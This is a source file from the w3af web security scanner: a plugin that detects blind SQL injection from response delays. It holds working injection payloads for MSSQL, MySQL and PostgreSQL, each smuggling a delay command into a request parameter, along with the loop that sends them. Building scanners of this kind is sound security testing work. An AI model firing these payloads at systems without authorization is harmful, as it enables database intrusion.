'''
blind_sqli_time_delay.py

Copyright 2008 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


from core.data.fuzzer.fuzzer import createMutants, createRandNum
import core.controllers.outputManager as om

import core.data.kb.vuln as vuln
import core.data.kb.knowledgeBase as kb
import core.data.constants.severity as severity

import core.data.constants.dbms as dbms

from core.controllers.w3afException import w3afException

# importing this to have sendMutant and setUrlOpener
from core.controllers.basePlugin.basePlugin import basePlugin

class blind_sqli_time_delay(basePlugin):
    '''
    This class tests for blind SQL injection bugs using time delays, 
    the logic is here and not as an audit plugin because this logic is also used in attack plugins.
    
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        # ""I'm a plugin""
        basePlugin.__init__(self)
        
        # The wait time of the first test I'm going to perform
        self._wait_time = 5
        
        # The original delay between request and response
        _original_wait_time = 0
        
    def is_injectable( self, freq, parameter ):
        '''
        Check if "parameter" of the fuzzable request object is injectable or not.
        
        @freq: The fuzzableRequest object that I have to modify
        @parameter: A string with the parameter name to test
        
        @return: A vulnerability object or None if nothing is found
        '''
        # First save the original wait time
        _original_wait_time = self._sendMutant( freq, analyze=False ).getWaitTime()
        
        # Create the mutants
        parameter_to_test = [ parameter, ]
        statement_list = self._get_statements()
        sql_commands_only = [ i.sql_command for i in statement_list ]
        mutants = createMutants( freq , sql_commands_only, fuzzableParamList=parameter_to_test )
        
        # And now I assign the statement to the mutant
        for statement in statement_list:
            for mutant in mutants:
                if statement.sql_command in mutant.getModValue():
                    mutant.statement = statement.sql_command
                    mutant.dbms = statement.dbms
        
        # Perform the test
        for mutant in mutants:
            
            # Send
            response = self._sendMutant( mutant, analyze=False )
            
            # Compare times
            if response.getWaitTime() > (_original_wait_time + self._wait_time-2):
                
                # Resend the same request to verify that this wasn't because of network delay
                # or some other rare thing
                _original_wait_time = self._sendMutant( freq, analyze=False ).getWaitTime()
                response = self._sendMutant( mutant, analyze=False )
                
                # Compare times (once again)
                if response.getWaitTime() > (_original_wait_time + self._wait_time-2):
                    
                    # Now I can be sure that I found a vuln, I control the time of the response.
                    v = vuln.vuln( mutant )
                    v.setName( 'Blind SQL injection - ' + mutant.dbms )
                    v.setSeverity(severity.HIGH)
                    v.setDesc( 'Blind SQL injection was found at: ' + mutant.foundAt() )
                    v.setDc( mutant.getDc() )
                    v.setId( response.id )
                    v.setURI( response.getURI() )
                    return v
                
        return None
    
    def _get_statements( self ):
        '''
        @return: A list of statements that are going to be used to test for
        blind SQL injections. The statements are objects.
        '''
        res = []
        
        # MSSQL
        res.append( statement("1;waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
        res.append( statement("1);waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
        res.append( statement("1));waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
        res.append( statement("1';waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
        res.append( statement("1');waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
        res.append( statement("1'));waitfor delay '0:0:"+str(self._wait_time)+"'--", dbms.MSSQL) )
        
        # MySQL
        # =====
        # MySQL doesn't have a sleep function, so I have to use BENCHMARK(1000000000,MD5(1))
        # but the benchmarking will delay the response a different amount of time in each computer
        # which sucks because I use the time delay to check!
        #
        # In my test environment 3500000 delays 10 seconds
        # This is why I selected 2500000 which is guaranteeded to (at least) delay 8
        # seconds; and I only check the delay like this:
        #                 response.getWaitTime() > (_original_wait_time + self._wait_time-2):
        #
        # With a small wait time of 5 seconds, this should work without problems...
        # and without hitting the xUrllib timeout !
        res.append( statement("1 or BENCHMARK(2500000,MD5(1))", dbms.MYSQL) )
        res.append( statement("1' or BENCHMARK(2500000,MD5(1)) or '1'='1", dbms.MYSQL) )
        res.append( statement('1" or BENCHMARK(2500000,MD5(1)) or "1"="1', dbms.MYSQL) )
        
        # PostgreSQL
        res.append( statement("1 or pg_sleep("+ str(self._wait_time) +")", dbms.POSTGRE) )
        res.append( statement("1' or pg_sleep("+ str(self._wait_time) +") or '1'='1", dbms.POSTGRE) )
        res.append( statement('1" or pg_sleep('+ str(self._wait_time) +') or "1"="1', dbms.POSTGRE) )
        
        # TODO: Add Oracle support
        # TODO: Add XXXXX support
        
        return res
        
class statement(object):
    def __init__(self, sql_command, dbms):
        self.sql_command = sql_command
        self.dbms = dbms
